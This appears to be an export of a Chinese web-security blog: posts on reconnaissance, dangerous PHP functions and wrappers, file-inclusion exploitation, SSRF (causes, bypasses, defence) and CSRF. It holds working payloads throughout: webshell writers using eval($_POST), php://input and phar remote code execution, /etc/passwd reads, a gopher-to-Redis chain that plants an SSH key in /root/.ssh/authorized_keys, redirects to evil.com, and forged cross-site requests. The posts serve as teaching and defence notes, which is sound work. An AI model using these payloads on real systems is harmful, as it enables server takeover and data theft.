邮箱：邮件服务器无法CDN，因此可以使用网站的邮件发送功能（如密码找回等）获取原IP，当然要确保网站的邮件服务器用的是自己的。 全网扫描：最笨的办法是使用工具扫描全网的IP段： zmap，zgrab(https://www.t00ls.net/articles-40631.html) fuckcdn.exe w8Fuckcdn 网站漏洞，如： SSRF phpinfo 服务器系统 网址大小写是否敏感判断Windows/Linux nmap识别系统 开放端口1nmap -T4 -sT -p- -sV 127.0.0.1 常用端口有： 3306 mysql1433 mssql1521 oracle5432 postgresql6379 redis27017 mongodb8080 tomcat/resin/jetty137 samba873 rsync5900 vnc WAF从HTTP头部获取WAF信息 https://github.com/Ekultek/WhatWaf wafw00f -a 域名 子域名、C段、旁站子域名收集 暴力枚举 (dnsrecon)[https://github.com/darkoperator/dnsrecon] subDomainsBrute layer子域名挖掘机 搜索引擎 site: anemone.top https://dnsdumpster.com/ VirusTotal Sublist3r（集合多家搜索引擎结果） 使用SSL/TLS证书查询 https://crt.sh/ bugcrowd-levelup-subdomain-enumeration https://censys.io/ https://developers.facebook.com/tools/ct/ https://google.com/transparencyreport/https/ct/ C站查询 http://www.webscan.cc/ http://ipwhois.cnnic.net.cn/ nmap -p 80,8080 --open ip/24 旁站查询 http://s.tool.chinaz.com/same 网站目录可能泄露的目录有： 网站后台 网站源代码备份，如: www.rar www.zip 版本控制 /.git/config （利用：GitTools，GitHacker） /.svn/entries （利用：Seay SVN漏洞利用工具） JavaWeb目录 /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 其他敏感文件泄露，如： phpinfo robots.txt .DS_Store(https://github.com/lijiejie/ds_store_exp) 推荐工具有： https://github.com/maurosoria/dirsearch 御剑，http://www.moonsec.com/post-753.html 其他信息 GitHub源码 https://github.com/FeeiCN/GSIL 网络资产搜索引擎： https://fofa.so/ http://www.yunsee.cn/ 参考链接 信息收集总结，https://blog.csdn.net/qq_33336310/article/details/86665344 Web安全 — 信息收集https://www.freebuf.com/column/155795.html 他山之石 | 渗透测试中的各种子域名枚举技术介绍，https://www.freebuf.com/articles/web/154809.html]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>waf探测</tag>
        <tag>cdn绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP中的危险函数和伪协议]]></title>
    <url>%2Fphp-PHP%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%2F</url>
    <content type="text"><![CDATA[复习一下PHP中常见的危险函数： 文件读取 file_get_contents()，该函数可以读取其他协议造成SSRF 123$src=$_GET['src'];$homepage = file_get_contents($src);echo $homepage; highlight_file()，高亮显示文件内容 show_source()，highlight_file()的别名 fopen()、fread()，fgets()、fgetss()、fpassthru()等 fread(fopen($filename,”r”), $size); //读取$size长度的文件 fgets(fopen($filename, “r”)); //读取一行 fgetss(fopen($filename, “r”)); //读取一行并过滤HTML标记 fpassthru(fopen($filename, “r”)); //读取到文件结束 readfile()，读取文件并返回至页面 123456789101112131415&lt;?php$file = $_GET['file'];if (file_exists($file)) &#123; header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($file).'"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); readfile($file); exit;&#125;?&gt; file()，把文件读进数组中 php_strip_whitespace()，读取一个php文件并返回一个去掉注释和换行的文本，有意思的是，该函数可以去掉任意语言的注释，只要这个语言的注释风格与php相同并且在文件头加入&lt;?php就行可： parse_ini_file()，只能读取ini文件 命令执行 system() shell_exec()，和system()差不多 passthru()，返回二进制的输出 exec(‘ls’, $array)，返回结果保存在array中 pcntl_exec()，不返回结果 popen()，返回一个文件指针 123$handle = popen("/bin/ls", "r");var_dump(fpassthru($handle));pclose($handle); proc_open()，增强型popen()，允许有三个通道（输入，输出，错误） &#96;(反单引号) escapeshellcmd() // 该函数用于过滤字符保证不执行其他恶意指令 代码执行 eval(“phpinfo();”) assert()，原用法是assert失败后，调用回调函数，它会将参数作为代码执行。 12$num=$_GET['num'];assert("is_int($num)"); payload为num=1)%20and%20phpinfo();//，注意若前面的条件不满足则用or，如a)%20or%20phpinfo();// preg_replace + ‘/e’,/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码，如 1echo preg_replace("/test/e",$_GET["cmd"],"just test"); payload为cmd=phpinfo()，注意该方法只在php 5.5.0以下版本有效。 create_function($args, ​$code)，创建一个匿名函数，由于内部是eval实现的，所以存在安全性问题，如： 12345$sort_by = $_GET['sort_by'];$databases=array('1234','4321');$sort_function = 'return strcmp($a["'.$sort_by.'"], $b["'.$sort_by.'"]);';usort($databases, create_function('$a, $b', $sort_function));print_r($databases); 构造payload的关键在于将create_function还原为eval实现的普通函数，接着按上下文闭合先前的函数逻辑（这里为strcmp）再加上其他语句;}phpinfo();/*，总之确保eval中的字符串拼接成一个php符合语法的语句： 12345eval( 'function lambda($a, $b)&#123; return strcmp($a["'.$sort_by.'"], $b["'.$sort_by.'"]); //replace with create_function &#125;'); 由此payload为sort_by=&quot;]);}phpinfo();/*，此时eval中的字符串拼接成： 1234function lambda($a, $b)&#123; return strcmp($a[""]);&#125;phpinfo();/*"], $b[""]);&#125;phpinfo();/*"]); &#125; call_user_func(callable $func, $arg)，调用func($arg)，若func可指定为assert则存在代码执行： 123$a=$_GET['a'];$b=$_GET['b'];call_user_func($a, $b); payload为a=assert&amp;b=phpinfo() call_user_func_array(callable $func , array $args_arr)，调用func，参数为数组$args_arr: 123$a=$_GET['a'];$b=$_GET['b'];call_user_func_array($a, $b); payload为a=assert&amp;b[]=phpinfo() array_map(callable $func, array $array1 [, array $… ])，将array中的元素应用到$callback函数上，有点像Python的map 123$a=$_GET['a'];$b=$_GET['b'];array_map($a, $b); payload为a=assert&amp;b[]=phpinfo() ob_start()，用法如下（只能显示一行）：1$cmd = 'system';ob_start($cmd);echo "$_GET[a]";ob_end_flush(); 文件上传 move_uploaded_file() getimagesize() //验证文件头只要为GIF89a，就会返回真 文件包含 require()，程序一运行就包含该文件 include()，执行到include时包含该文件 require_once()，include_once()：若已包含过则不再包含 allow_url_include = on，打开远程文件包含 变量覆盖 extract() import_request_variables() parse_str() mb_parse_str()全局变量覆盖：register_globals为ON，$GLOBALS 伪协议 php://filter，结合base64读取文件用，如： 12345$ curl http://localhost/include.php?file=php://filter/read=convert.base64-encode/resource=include.php|base64 -d % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 45 100 45 0 0 5000 0 --:--:-- --:--:-- --:--:-- 5000&lt;?php include($_GET['file']);?&gt; php://input，将post作为输入，在远程文件包含和file_get_contents()时可以利用造成RCE，如： 1234567$ curl -X POST http://localhost/include.php?file=php://input --data "&lt;?php system('ls -al');?&gt;"total 126drwxr-xr-x 1 Anemone 197121 0 Feb 8 11:22 .drwxr-xr-x 1 Anemone 197121 0 May 6 2018 ..-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg-rw-r--r-- 1 Anemone 197121 2117 Sep 21 21:53 aizhixi.php data://，将data后的get请求作为输入，在远程文件包含时可造成RCE，如： 12345678910$ echo "&lt;?php system('ls -al');?&gt;"|base64PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo=$ curl "http://localhost/include.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo="total 126drwxr-xr-x 1 Anemone 197121 0 Feb 8 11:22 .drwxr-xr-x 1 Anemone 197121 0 May 6 2018 ..-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg-rw-r--r-- 1 Anemone 197121 2117 Sep 21 21:53 aizhixi.php zip://、compress.bzip2://、compress.zlib://，读取一个.zip/.bz2/.gz文件中的文件，可以将一句话压缩造成RCE： 12345678910$ echo "&lt;?php echo system('ls -al');?&gt;" &gt; ls.php$ zip -r shell.zip ls.php adding: ls.php (stored 0%)# 上传后$ curl "http://localhost/include.php?file=phar://./shell.zip/ls.php"total 128drwxr-xr-x 1 Anemone 197121 0 Feb 8 16:11 .drwxr-xr-x 1 Anemone 197121 0 May 6 2018 ..-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg phar://，读取一个phar/zip文件，可以利用成RCE: 1234567891011121314$ cat phar.php&lt;?php$phar = new Phar('shell.phar', 0);$phar['shell.php'] = '&lt;?php echo 12321; eval($_POST[\'cmd\']);?&gt;' ;$phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;');?&gt;$ php phar.php# 上传phar后$ curl "http://localhost/include.php?file=phar://./shell.phar/shell.php" --data "cmd=system('ls -al');"12321total 128drwxr-xr-x 1 Anemone 197121 0 Feb 8 16:11 .drwxr-xr-x 1 Anemone 197121 0 May 6 2018 ..-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg 参考链接 php代码审计小总结，https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/ 命令执行与代码执行的小结，https://www.anquanke.com/post/id/162128]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞利用]]></title>
    <url>%2Fphp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[本地文件包含1&lt;?php include($_GET['file']);?&gt; 文件读取本地文件包含可以作为文件读取使用： 12345$ curl http://127.0.0.1/include.php?file=/etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologin... 可读如下敏感文件： Windows: C:\boot.ini //查看系统版本 C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件 C:\Windows\repair\sam //存储系统初次安装的密码 C:\Program Files\mysql\my.ini //Mysql配置 C:\Program Files\mysql\data\mysql\user.MYD //Mysql root C:\Windows\php.ini //php配置信息 C:\Windows\my.ini //Mysql配置信息 Linux: ~/.ssh/authorized_keys /etc/passwd /etc/my.cnf /etc/httpd/conf/httpd.conf /var/log/apache2/access.log /var/log/httpd/access_log 包含图片马GetShell首先上传图片马img.gif: 1GIF89a &lt;?php phpinfo();?&gt; 然后包含图片马，后缀名无限制： 包含日志GetShell先访问/include.php?file=&lt;?=&#96;ls&#96;?&gt;，将命令写入日志。 再包含日志GetShell： php://filterphp://filter可以用来结合base64读取php源代码，payload为：php://filter/read=convert.base64-encode/resource=include.php 绕过限制 %00截断 ?file=../../../etc/pwd%00 路径长度阶段 ?file=../../../etc/pwd/././.[…]/././. ?file=../../../boot.ini/….[…]……… 远程文件包含需要All_url_fopen=On(默认开启)和Allow_url_include=On(默认关闭) 直接包含远程一句话1/include.php?file=http://127.0.0.2/a.txt a.txt: 1&lt;?php fputs(fopen("shell.php","w"),"&lt;?php @eval($_POST[xxx]); ?&gt;") ?&gt; php://inputphp://input可以将post部分请求作为一个php的只读文件流 生成一句话payload: 1&lt;?php fputs(fopen("shell.php","w"),"&lt;?php eval($_POST['xxxser']);?&gt;") ?&gt; 参考链接 PHP文件包含漏洞，https://www.cnblogs.com/lazy0/p/1e9caec7bfdc3a3291ebeefb8923549d.html 文件包含漏洞，https://www.cnblogs.com/bmjoker/p/9035259.html]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF成因、利用和防御]]></title>
    <url>%2Fssrf-SSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[SSRF成因SSRF是指存在漏洞的服务器存在对外发起请求的功能，而请求源可由攻击者控制并且服务器本身没有做合法验证，诸如如下代码： 123456789101112131415&lt;?PHP $url = $_GET['url']; $ch = CURL_INIT(); CURL_SETOPT($ch, CURLOPT_URL, $url); CURL_SETOPT($ch, CURLOPT_HEADER, FALSE); CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, TRUE); CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // 允许302跳转 CURL_SETOPT($ch, CURLOPT_FOLLOWLOCATION, TRUE); $res = CURL_EXEC($ch); // 设置CONTENT-TYPE CURL_CLOSE($ch) ; //返回响应 echo $res;?&gt; 就如上文所说，通过控制url参数可以使服务器可访问人任意网站，如http://localhost/ssrf.php?url=http://www.baidu.com： 由于是服务端产生的跳转，因此用户这里看不到访问百度的请求，也因此攻击者可以利用其探索内网资源。 参考猪猪侠的PPT，容易发生SSRF漏洞的地方有： 从远程服务器请求资源（Upload from URL，Import &amp; Export RSS feed） 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB） Webmail收取其他邮箱邮件（POP3、IMAP、SMTP） 文件处理、编码处理、属性信息处理（ffpmg、ImageMagic、DOCX、PDF、XML处理器） FFmpeg: concat： http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd ImageMagick: fill ‘url(http://ssrf.wuyun.org)’ SVG, JPG, XML, Json 容易发生SSRF漏洞的服务有： 图片加载与下载：通过URL地址加载或下载图片 Webhooks 通过URL地址分享网页内容 转码服务 在线翻译 图片、文章收藏功能 未公开的api实现以及其他调用URL的功能 从URL关键字中寻找 利用方式总的来说，一个网站存在SSRF则会有如下利用点 服务探测 关键在于对通过报错信息、响应时间判断是否服务是否存在 文件读取 主要使用file协议对文件进行读取操作 对内网服务进行攻击（如redis写文件） 使用FastCGI进行远程命令执行 SSRF转反射式XSS 如：http://localhost:4567/?url=http://brutelogic.com.br/poc.svg 在PDF中嵌入脚本 使用https://pdfcrowd.com/#convert_by_input，将html嵌入pdf中： 12&lt;iframe src=”file:///etc/passwd” width=”400" height=”400"&gt;"&gt;&lt;svg/onload=document.write(document.location)&gt; -- to know the path and some times to know what os they are using at backend 可利用的协议支持的协议远不止这些，仅列出常用的： file:// 用于读取本地文件，如：http://example.com/ssrf.php?url=file:///etc/passwd http:// &amp; https:// 用于访问内网http服务 ftp:// 访问FTP服务 dict://xxx/info 可以泄露软件版本，或是操作内网redis服务等 gopher:// java支持，php需要开启Gopher wrapper，%0a用于换行，具体用法如： 1234567891011// http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php&lt;?php header(&apos;Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest&apos;);?&gt;evil.com:# nc -v -l 12346Listening on [0.0.0.0] (family 0, port 12346)Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)HIMultilinetest 绕过方式绕过IP限制十六进制IP如：0xA000001=10.0.0.1 十进制IP如：167772161=10.0.0.1 八进制IP如 012.0.0.1=10.0.0.1 绕过Domain限制xip.io 如：http://www.baidu.com.192.168.1.10.xip.io（将www.baidu.com地址解析到192.168.1.10） nip.io特殊字母1234http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ HTTP 基础认证如：http://xxx.com@attacker.com DNS Rebinding基本原理是自建DNS服务器，使第一次解析为外网ip，第二次解析为内网ip 在自己域名上绑定A记录和NS记录： A记录指将ns1.anemone.top解析到118.x.x.184 NS记录指子域名test.anemone.top由ns1.anemone.top来解析 同时在一个dns服务（这里我在腾讯云上没试验成功，猜测是腾讯云屏蔽了udp端口的入向）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python# coding=utf-8# @file dns_server.py# @brief dns_server# @author Anemone95,x565178035@126.com# @version 1.0# @date 2019-02-06 14:58from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord=&#123;&#125;class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name if name not in record or record[name]&lt;1: ip="104.160.43.154" else: ip="127.0.0.1" if name not in record: record[name]=0 record[name]+=1 print(name+" ===&gt; "+ip) answer = dns.RRHeader( name=name, type=dns.A, cls=dns.IN, ttl=0, payload=dns.Record_A(address=b'%s'%ip,ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query))def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run()if __name__ == '__main__': raise SystemExit(main()) 结果（只能模拟一下效果）： 绕过协议限制302跳转攻击者建立http://127.0.0.1:8888/302.php： 123&lt;?phpheader("Location: dict://127.0.0.1:6379/set:1:helo");?&gt; 接着访问靶机： 1http://localhost/ssrf.php?url=http://127.0.0.1:8888/302.php 可以看到脆弱服务器6379端口收到了请求，协议被绕过： 使用%0d%0a(\r\n)之所以要使用其他协议是因为http的get请求没有换行，那么在url中加上%0d%0a就有可能模拟一个换行操作： 12345operator=http://wuyun.org:6379/helo%0d%0a(\r\n)config set dir /etc/cron.d/%0d%0a(\r\n)quit%0d%0a(\r\n) Gopher利用Redis示例gopher://协议可以模拟出tcp client的效果，因此可以模拟redis-cli，若服务器redis存在漏洞的话，就可以通过该方法提权。 准备一个普通redis攻击时用的脚本，注意192.168.99.100和6379需要替换成自己的redis IP和端口（不是攻击者的） 1234567(echo -e "\n\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n\n") &gt; upload.txtcat ~/upload.txt | redis-cli -h $1 -p $2 -x set tmpredis-cli -h $1 -p $2 -x config set dir /root/.sshredis-cli -h $1 -p $2 -x config set dbfilename authorized_keysredis-cli -h $1 -p $2 -x get tmpredis-cli -h $1 -p $2 -x saveredis-cli -h $1 -p $2 -x quit 关于脚本的解释可以看redis未授权&amp;弱密码漏洞复现和防护 拦截6379的数据包： 1socat -v tcp-listen:4444,fork tcp-connect:192.168.70.128:6379 2&gt;&amp;1|tee socat.log 执行脚本，将攻击流量打到测试机器上： 1bash shell.sh 127.0.0.1 4444 这时socat那看到攻击流量： 使用脚本将攻击流量转换为gopher协议，先来了解一下socat日志记录tcp流的格式： &lt;开头一行表示客户端发送来了一个tcp包，下面为包内容，如： 12345678910&gt; 2019/02/06 21:58:17.968244 length=51 from=0 to=50*4\r$6\rconfig\r$3\rset\r$3\rdir\r$10\r/root/.ssh\r &gt;开头一行表示服务器返回一个tcp包，下面为包内容，如： 12&lt; 2019/02/06 21:58:17.981363 length=5 from=0 to=4+OK\r 基于以上格式，将客户端发送的tcp包转换为payload： 将\r字符串替换成%0d%0a 空白行替换为%0a 空格替换成%20 再使用urlencode（给php时会做一次decode，curl再做一次decode） 1234567891011121314151617181920212223242526272829303132333435363738import systry: from urllib import quoteexcept ImportError: from urllib.parse import quoteexp = ''socat_file=sys.argv[1]# socat_file='./socat.log'client_tcp=Truewith open(socat_file) as f: for line in f.readlines(): if line.startswith('&gt;'): client_tcp=True continue if line.startswith('&lt;'): client_tcp=False continue if client_tcp: # 判断倒数第2、3字符串是否为\r if line[-3:-1] == r'\r': # 如果该行只有\r，将\r替换成%0a%0d%0a if len(line) == 3: exp = exp + '%0a%0d%0a' else: line = line.replace(r'\r', '%0d%0a') # 去掉最后的换行符 line = line.replace('\n', '') exp = exp + line # 判断是否是空行，空行替换为%0a elif line == '\x0a': exp = exp + '%0a' else: line = line.replace(' ', '%20') line = line.replace('\n', '') exp = exp + lineexp=quote(exp)print(exp) 使用脚本生成payload： 1python socat2gopher.py socat.log 将exp用gopher协议发送（这里的192.168.70.128:6379是受害者内网的redis服务器）： 1curl -v 'http://127.0.0.1/ssrf.php?url=gopher://192.168.70.129:6379/_%2A3%250d%250a%243%250d%250aset%250d%250a%243%250d%250atmp%250d%250a%24413%250d%250a%250a%250a%250a%250assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABAQDNPLyFJPazctB0%2BJAWQ8%2B5pNIOlGMYLmTupLXT5EjFkEDzKhkGu8l%2BC4ja/s4IIoMBtoxDPcogMLRFtxWv%2BA6WIvFQhAsqcaDBl48mXmsiHtKJbooNLplu/fTvdSjisnaF8Qsa/zRSWubPSfzzz5ObhsLhpXD/hcMofUZxofbysT0yWhmlTdC7i2GDIxlZPlSdpAxwPo0BgaP5GO/6GQ49GC4niw5j2UTAqBDQWqwWww5yxNXU/iY9YY83MUbMpuUlLgmpne1lFhY2jQ69uPiVPKUWWHPcNHgIeNqVAoTCFXSvjVgnDu/iHQSkm0o0uW/who12xgxAOXm3MU1cX9gL%2520anemone%40DESKTOP-ANEMONE%250a%250a%250a%250a%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2410%250d%250a/root/.ssh%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%2415%250d%250aauthorized_keys%250d%250a%2A2%250d%250a%243%250d%250aget%250d%250a%243%250d%250atmp%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a' 返回5个+OK表示写入成功： 可以看到远程服务器上的公钥已经写入： ssh可以登录： 防御措施考虑到以上的各种绕过，产生如下基本思路（参考p神的谈一谈如何在Python开发中拒绝SSRF漏洞）： 只允许http或https协议 解析目标URL，获取其host 解析host，获取host指向的IP地址转换成long型 检查IP地址是否为内网IP 请求URL 如果有跳转，拿出跳转URL，执行1(或者直接进用302跳转)，否则返回页面结果 参考PHP开发中防御SSRF给出php的实现（Python实现请看谈一谈如何在Python开发中拒绝SSRF漏洞）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpfunction safe_request($url)&#123; $ch = CURL_INIT(); CURL_SETOPT($ch, CURLOPT_HEADER, FALSE); CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, TRUE); CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, FALSE); while(true)&#123; // 0.判断URL合法性 if (!$url || !filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED))&#123; return false; &#125; // 1.仅允许http或https协议 if(!preg_match('/^https?:\/\/.*$/', $url))&#123; return false; &#125; // 2.解析目标URL，获取其host $host = parse_url($url, PHP_URL_HOST); if(!$host)&#123; return false; &#125; // 3.解析host，获取host指向的IP地址 $ip = gethostbyname($host); $ip = ip2long($ip); if($ip === false)&#123; return false; &#125; // 4.检查IP地址是否为内网IP $is_inner_ipaddress = ip2long('127.0.0.0') &gt;&gt; 24 == $ip &gt;&gt; 24 or ip2long('10.0.0.0') &gt;&gt; 24 == $ip &gt;&gt; 24 or ip2long('172.16.0.0') &gt;&gt; 20 == $ip &gt;&gt; 20 or ip2long('192.168.0.0') &gt;&gt; 16 == $ip &gt;&gt; 16; if($is_inner_ipaddress)&#123; return false; &#125; // 5.请求URL CURL_SETOPT($ch, CURLOPT_URL, $url); $res = CURL_EXEC($ch); $code = curl_getinfo($ch,CURLINFO_HTTP_CODE); // 6.如果有跳转，获取跳转URL执行1, 否则返回响应 if (300&lt;=$code and $code&lt;400)&#123; $headers = curl_getinfo($ch); $url=$headers["redirect_url"]; &#125; else &#123; CURL_CLOSE($ch) ; return $res; &#125; &#125;&#125; $url = $_GET['url']; // $url="http://localhost:8888/302.php"; $res=safe_request($url); if($res) echo var_dump($res);?&gt; 参考链接 SSRF漏洞分析与利用，http://www.91ri.org/17111.html SSRF漏洞(原理&amp;绕过姿势)，https://www.t00ls.net/articles-41070.html SSRF Tips，http://blog.safebuff.com/2016/07/03/SSRF-Tips/ 谈一谈如何在Python开发中拒绝SSRF漏洞，https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html PHP开发中防御SSRF，https://www.jianshu.com/p/6ea9b8652d73 SSRF in the Wild, https://medium.com/swlh/ssrf-in-the-wild-e2c598900434]]></content>
      <categories>
        <category>Web安全-SSRF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF成因、攻击和防御]]></title>
    <url>%2Fcsrf-CSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[CSRF成因GET型脆弱代码存在CSRF的GET型请求如下： 1234567891011121314151617181920@app.route('/get', methods=['GET'])def get(): if session.get('user','')=='admin': ret = "Admin do something!" else: ret = "No Privilege..." return ret@app.route('/login', methods=['GET'])def login(): user=request.args.get("user", "Null") session["user"]=user template=""" &lt;h3&gt; Login as &#123;&#123; user &#125;&#125;... &lt;/h3&gt; """ return render_template_string(template, user=user)if __name__ == '__main__': app.run(host='127.0.0.1', port=8888, debug=True) 先使用http://127.0.0.1:8888/login?user=admin模拟用户admin登陆，从代码可以看到登陆后网站将用户身份（简单起见就是用户名）保存到session中。 接着访问http://127.0.0.1:8888/get可以看到用户具有这一权限，可以进行操作（假设这一链接是一个关键操作，如重置密码或泄露其他敏感信息的操作）。 攻击方法如果用户访问了恶意网页，恶意网页诱导用户访问http://127.0.0.1:8888/get或是用js发送一个get请求，那么用户由于sessionID还存在于浏览器中，因此会在无意间使用自己的身份重置密码，如用于访问了如下内容的网页： 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;AJAX&lt;/title&gt;&lt;/head&gt;&lt;script&gt; var xhr = new XMLHttpRequest(); xhr.open("GET", "http://127.0.0.1:8888/get", true); xhr.withCredentials = true; xhr.send(); xhr.onreadystatechange = function()&#123; if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123; alert(xhr.responseText); &#125; &#125;&lt;/script&gt;&lt;/html&gt; 尽管同源策略导致js拿不到结果，但是请求仍然会正常发送： POST 表单型脆弱代码有人认为CSRF产生的原因是因为GET请求类型造成的，其实不然，如下就是一个POST类型的代码，它同样存在CSRF问题：123456789101112131415161718192021@app.route('/post', methods=['GET','POST'])def post(): if request.method == 'GET': template=""" &lt;form action="http://127.0.0.1:8888/reset" method="POST"&gt; &lt;input name="action" type="text"&gt; &lt;input type="submit"&gt; &lt;/form&gt; """ return render_template_string(template) else: print(request.form) data=request.form["action"] print("session:",session) if session.get('user','')=='admin': print("Admin do", data) return "Admin do "+data else: print("No Privilege2...") return "No Privilege2..." 攻击方法攻击者只需要同样的伪造POST表单即可，这里我们换用fetch()试一下，当然XMLHttpRequest()也可以。 1fetch('http://127.0.0.1:8888/post',&#123;method: 'POST', credentials: 'include', headers:&#123;'Content-Type': 'application/x-www-form-urlencoded'&#125;, body:'action=reset+password'&#125;) 尽管同源再一次没让我们拿到结果，但是请求还是发过去了： POST JSON型如果服务器严格限制了Content-Type=application/json，理论上是不存在CSRF的，因为该请求属于非简单请求，非简单请求会发先检请求确认是否允许跨域，如果不允许跨域的话js就没法使用cookie。 但是若服务器不判断content-type，那么攻击者就可以使用表单或是js伪造一个Content-Type=text/plain的请求。 脆弱代码123456789101112131415161718192021222324252627282930@app.route('/json', methods=['GET','POST','OPTIONS'])def _json(): if request.method == 'GET': template=""" &lt;script type="text/javascript"&gt; function 